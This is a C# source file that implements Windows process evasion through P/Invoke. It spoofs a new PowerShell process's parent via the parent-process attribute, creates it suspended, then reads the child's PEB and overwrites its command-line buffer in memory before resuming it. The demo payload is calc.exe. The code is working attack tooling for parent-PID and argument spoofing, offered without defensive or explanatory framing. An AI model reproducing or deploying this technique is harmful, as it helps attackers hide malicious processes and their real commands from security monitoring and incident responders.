using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;


public class ProcessCreator
{
    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool CreateProcess(
        string lpApplicationName, 
        string lpCommandLine, 
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes, 
        bool bInheritHandles,
        CreateProcessFlags dwCreationFlags,
        IntPtr lpEnvironment, 
        string lpCurrentDirectory, 
        [In] ref STARTUPINFOEX lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute(
        IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
        IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList(
        IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern int GetCurrentThread();



    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        uint processAccess,
        bool bInheritHandle,
        int processId
    );
    public enum NTSTATUS : uint
    {
        Success = 0,
        Informational = 0x40000000,
        Error = 0xc0000000
    }

    [StructLayout(LayoutKind.Explicit, Size = 18)]
    public struct CURDIR
    {
        [FieldOffset(0)]
        public UNICODE_STRING DosPath;
        [FieldOffset(16)]
        public IntPtr Handle;
    }
  

    [DllImport("kernel32.dll")]
    public static extern void RtlZeroMemory(
        IntPtr pBuffer,
        int length
    );

    [DllImport("ntdll.dll")]
    public static extern UInt32 NtQueryInformationProcess(
        IntPtr processHandle,
        UInt32 processInformationClass,
        ref PROCESS_BASIC_INFORMATION processInformation,
        int processInformationLength,
        ref UInt32 returnLength
    );


    [DllImport("ntdll.dll", SetLastError = true)]
    static extern Boolean NtReadVirtualMemory(
        IntPtr ProcessHandle, 
        IntPtr BaseAddress,
        IntPtr Buffer,
        UInt32 NumberOfBytesToRead, 
        ref UInt32 liRet
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern NTSTATUS NtWriteVirtualMemory(
        IntPtr ProcessHandle, 
        IntPtr BaseAddress, 
        IntPtr BufferAddress,
        UInt32 nSize,
        ref UInt32 lpNumberOfBytesWritten
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(IntPtr hThread);

    /*
    public static IntPtr OpenProcess(Process proc, ProcessAccessFlags flags)
    {
        return OpenProcess(flags, false, proc.Id);
    }
    */

    [Flags]
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }


    [Flags]
    public enum ProcessParametersFlags : uint
    {
        NORMALIZED = 0x01,
        PROFILE_USER = 0x02,
        PROFILE_SERVER = 0x04,
        PROFILE_KERNEL = 0x08,
        UNKNOWN = 0x10,
        RESERVE_1MB = 0x20,
        DISABLE_HEAP_CHECKS = 0x100,
        PROCESS_OR_1 = 0x200,
        PROCESS_OR_2 = 0x400,
        PRIVATE_DLL_PATH = 0x1000,
        LOCAL_DLL_PATH = 0x2000,
        NX = 0x20000,
    }


    [Flags]
    enum CreateProcessFlags
    {
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NEW_CONSOLE = 0x00000010,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_NO_WINDOW = 0x08000000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_SUSPENDED = 0x00000004,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        DEBUG_PROCESS = 0x00000001,
        DETACHED_PROCESS = 0x00000008,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        INHERIT_PARENT_AFFINITY = 0x00010000
    }


    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr ExitStatus;
        public IntPtr PebBaseAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public UIntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }

    /*
    [StructLayout(LayoutKind.Sequential)]
    public struct _RTL_DRIVE_LETTER_CURDIR
    {
        UInt16 Flags;
        UInt16 Length;
        UInt32 TimeStamp;
        UNICODE_STRING DosPath;
    }
    */


    [StructLayout(LayoutKind.Explicit, Size = 136)]
    public struct RTL_USER_PROCESS_PARAMETERS
    {
        [FieldOffset(0)]
        public UInt32 MaximumLength;
        [FieldOffset(4)]
        public UInt32 Length;
        [FieldOffset(80)]
        public UNICODE_STRING DllPath;
        [FieldOffset(96)]
        public UNICODE_STRING ImagePathName;
        [FieldOffset(112)]
        public UNICODE_STRING CommandLine;
        [FieldOffset(128)]
        public IntPtr Environment; // PVOID
        //[MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x20)]
        //public UNICODE_STRING DLCurrentDirectory;
    };



    [StructLayout(LayoutKind.Explicit, Size = 8)]
    struct LARGE_INTEGER
    {
        [FieldOffset(0)] public UInt32 LowPart;
        [FieldOffset(4)] public Int32 HighPart;
    }

    [StructLayout(LayoutKind.Explicit, Size = 64)]
    public struct PEB
    {
        [FieldOffset(12)]
        public IntPtr Ldr32;
        [FieldOffset(16)]
        public IntPtr ProcessParameters32;
        [FieldOffset(24)]
        public IntPtr Ldr64;
        [FieldOffset(28)]
        public IntPtr FastPebLock32;
        [FieldOffset(32)]
        public IntPtr ProcessParameters64;
        [FieldOffset(56)]
        public IntPtr FastPebLock64;
    }

    [StructLayout(LayoutKind.Explicit, Size = 16)]
    public struct UNICODE_STRING : IDisposable
    {
        [FieldOffset(0)]
        public ushort Length;
        [FieldOffset(2)]
        public ushort MaximumLength;
        [FieldOffset(8)]
        public IntPtr buffer;

        public UNICODE_STRING(string s)
        {
            Length = (ushort)(s.Length * 2);
            MaximumLength = (ushort)(Length + 2);
            buffer = Marshal.StringToHGlobalUni(s);
        }

        public void Dispose()
        {
            Marshal.FreeHGlobal(buffer);
            buffer = IntPtr.Zero;
        }

        public override string ToString()
        {
            return Marshal.PtrToStringUni(buffer);
        }
    }




    public static bool CreateProcess(int parentProcessId)
    {
        //const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
        //const int CREATE_SUSPENDED = 0x00000004;
        const int SW_HIDE = 0;

        var pInfo = new PROCESS_INFORMATION();
        var sInfoEx = new STARTUPINFOEX();

        sInfoEx.StartupInfo.cb = Marshal.SizeOf(sInfoEx);
        sInfoEx.StartupInfo.dwFlags = 1;
        sInfoEx.StartupInfo.wShowWindow = SW_HIDE;

        IntPtr lpValue = IntPtr.Zero;
        IntPtr newProcessHandle;
        UInt32 sizePtr = 0;
        bool result;
        string nullstr = null;
        PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
        Boolean successEx = false;
        LARGE_INTEGER liRet = new LARGE_INTEGER();
        

        try
        {
            if (parentProcessId > 0)
            {
                var lpSize = IntPtr.Zero;
                var success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                if (success || lpSize == IntPtr.Zero)
                {
                    return false;
                }

                sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                success = InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);
                if (!success)
                {
                    return false;
                }

                var parentHandle = OpenProcess((uint)ProcessAccessFlags.All, false, parentProcessId); ;
                // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, parentHandle);

                success = UpdateProcThreadAttribute(
                    sInfoEx.lpAttributeList,
                    0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero);
                if (!success)
                {
                    return false;
                }
            }

            
            

            var pSec = new SECURITY_ATTRIBUTES();
            var tSec = new SECURITY_ATTRIBUTES();
            pSec.nLength = Marshal.SizeOf(pSec);
            tSec.nLength = Marshal.SizeOf(tSec);
            //var lpApplicationName = Path.Combine(Environment.SystemDirectory, "notepad.exe");

            
            string ori_command = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe start-process calc.exe";
            result = CreateProcess(
                nullstr, 
                ori_command,
                IntPtr.Zero,
                IntPtr.Zero, 
                true,
                CreateProcessFlags.CREATE_SUSPENDED |
                CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT |
                CreateProcessFlags.CREATE_NEW_CONSOLE, 
                IntPtr.Zero, 
                null, 
                ref sInfoEx, 
                out pInfo
            );

            uint ei = 0;
            PEB PebBlock = new PEB();
            RTL_USER_PROCESS_PARAMETERS parameters = new RTL_USER_PROCESS_PARAMETERS();
            Int32 commandline_len = (ori_command.Length) * 2;
            IntPtr pMemLoc = Marshal.AllocHGlobal(Marshal.SizeOf(PebBlock));
            IntPtr pMemLoc2 = Marshal.AllocHGlobal(Marshal.SizeOf(parameters));
            IntPtr pMemLoc_com = Marshal.AllocHGlobal(commandline_len);
            string command_get = "";

            uint getsize = 0;
            Int32 ReadSize = 64;
            Int32 RTL_USER_PROCESS_PARAMETERS = 0x20;
            IntPtr pMemLoc3 = Marshal.AllocHGlobal(ReadSize);

            // The RtlSecureZeroMemory routine fills a block of memory with zeros in a way that is guaranteed to be secure.
            // RtlZeroMemory(pMemLoc, ReadSize * 2); 
            // The RtlSecureZeroMemory routine fills a block of memory with zeros in a way that is guaranteed to be secure.
            RtlZeroMemory(pMemLoc2, Marshal.SizeOf(parameters));
            RtlZeroMemory(pMemLoc3, ReadSize);
            RtlZeroMemory(pMemLoc_com, commandline_len);
            newProcessHandle = OpenProcess((uint)ProcessAccessFlags.All, false, pInfo.dwProcessId);
            UInt32 queryResult = NtQueryInformationProcess(newProcessHandle, 0, ref pbi, Marshal.SizeOf(pbi), ref sizePtr);
            IntPtr RTL_Address = (IntPtr)((pbi.PebBaseAddress).ToInt64() + RTL_USER_PROCESS_PARAMETERS)
;
            //System.Threading.Thread.Sleep(5000);
            successEx = NtReadVirtualMemory(newProcessHandle, (IntPtr)(pbi.PebBaseAddress), pMemLoc, (uint)ReadSize, ref getsize);
            Marshal.GetLastWin32Error();
            //UInt64 ProcParams2 = (UInt64)Marshal.ReadInt64(pMemLoc3);

            //Console.WriteLine("RTL_Address: " + string.Format("{0:X}", (UInt64)ProcParams2));

            PebBlock = (PEB)Marshal.PtrToStructure(pMemLoc, typeof(PEB));
            //parameters = (RTL_USER_PROCESS_PARAMETERS)Marshal.PtrToStructure(PebBlock.ProcessParameters64, typeof(RTL_USER_PROCESS_PARAMETERS));
            //Console.WriteLine(parameters.CommandLine.Length);
            //Console.WriteLine(parameters.CommandLine.n);
            successEx = NtReadVirtualMemory(newProcessHandle, PebBlock.ProcessParameters64, pMemLoc2, (uint)Marshal.SizeOf(parameters), ref getsize);
            parameters = (RTL_USER_PROCESS_PARAMETERS)Marshal.PtrToStructure(pMemLoc2, typeof(RTL_USER_PROCESS_PARAMETERS));
         

            successEx = NtReadVirtualMemory(newProcessHandle, parameters.CommandLine.buffer, pMemLoc_com, (uint)commandline_len, ref getsize);
            command_get = Marshal.PtrToStringUni(pMemLoc_com, ori_command.Length);
            

            Console.WriteLine("Original command：" + command_get);
            UInt64 ProcParams;
            Int32 CommandLine = 0x70;
            //successEx = NtReadVirtualMemory(newProcessHandle, parameters.CommandLine.buffer, pMemLoc_com, (uint)Marshal.SizeOf(commandline), ref getsize);
            //commandline = (U)Marshal.PtrToStructure(pMemLoc2, typeof(RTL_USER_PROCESS_PARAMETERS));

            /*
            if (ReadSize == 0x4)
            {
                ProcParams = (UInt64)Marshal.ReadInt32(parameters.CommandLine.buffer);
            }
            else
            {
                ProcParams = (UInt64)Marshal.ReadInt64(parameters.CommandLine.buffer);
            }
            
            Console.WriteLine("[+] RTL_USER_PROCESS_PARAMETERS   : 0x" + string.Format("{0:X}", ProcParams));
            UInt64 CmdLineUnicodeStruct = ProcParams;
            Console.WriteLine("[+] CommandLine                   : 0x" + string.Format("{0:X}", CmdLineUnicodeStruct));
            */

            //NtReadVirtualMemory(newProcessHandle, , parameters, Len(parameters), liRet)
            string cmdStr = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            short cmdStr_Length = (short)(2 * cmdStr.Length);
            short cmdStr_MaximumLength = (short)(2 * cmdStr.Length + 2);

            IntPtr cmdStr_Length_Addr = Marshal.AllocHGlobal(Marshal.SizeOf(cmdStr_Length));
            IntPtr cmdStr_MaximumLength_Addr = Marshal.AllocHGlobal(Marshal.SizeOf(cmdStr_MaximumLength));

            Marshal.WriteInt16(cmdStr_Length_Addr, cmdStr_Length);
            Marshal.WriteInt16(cmdStr_MaximumLength_Addr, cmdStr_MaximumLength);



            IntPtr real_command_addr = IntPtr.Zero;

            real_command_addr = Marshal.StringToHGlobalUni(cmdStr);

            
            //byte[] bytes = Encoding.ASCII.GetBytes(cmdStr); ;

            NTSTATUS ntstatus = new NTSTATUS();

            
            ntstatus = NtWriteVirtualMemory(newProcessHandle, PebBlock.ProcessParameters64 + CommandLine + 0x2, cmdStr_MaximumLength_Addr, (uint)Marshal.SizeOf(cmdStr_MaximumLength), ref getsize);
            ntstatus = NtWriteVirtualMemory(newProcessHandle, PebBlock.ProcessParameters64 + CommandLine, cmdStr_Length_Addr, (uint)Marshal.SizeOf(cmdStr_Length), ref getsize);

            IntPtr com_zeroAddr = Marshal.AllocHGlobal((ori_command.Length) * 2);
            RtlZeroMemory(com_zeroAddr, (ori_command.Length) * 2);

            ntstatus = NtWriteVirtualMemory(newProcessHandle, parameters.CommandLine.buffer, com_zeroAddr, (uint)(2 * (ori_command.Length)), ref getsize);

            ntstatus = NtWriteVirtualMemory(newProcessHandle, parameters.CommandLine.buffer, real_command_addr, (uint)(2 * (cmdStr.Length)), ref getsize);



            Console.WriteLine(GetCurrentThread());
            //ResumeThread(pInfo.hProcess);
            ResumeThread(pInfo.hThread);
            //ResumeThread(newProcessHandle);
            //ResumeThread(newProcessHandle);
            //bool create_success = CreateProcess(lpApplicationName, null, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfoEx, out pInfo);

            //return create_success;
            //CreateProcess(lpApplicationName, null, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
            return true;
        }
        finally
        {
            // Free the attribute list
            if (sInfoEx.lpAttributeList != IntPtr.Zero)
            {
                DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
            }
            Marshal.FreeHGlobal(lpValue);

            // Close process and thread handles
            if (pInfo.hProcess != IntPtr.Zero)
            {
                CloseHandle(pInfo.hProcess);
            }
            if (pInfo.hThread != IntPtr.Zero)
            {
                CloseHandle(pInfo.hThread);
            }
        }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }
}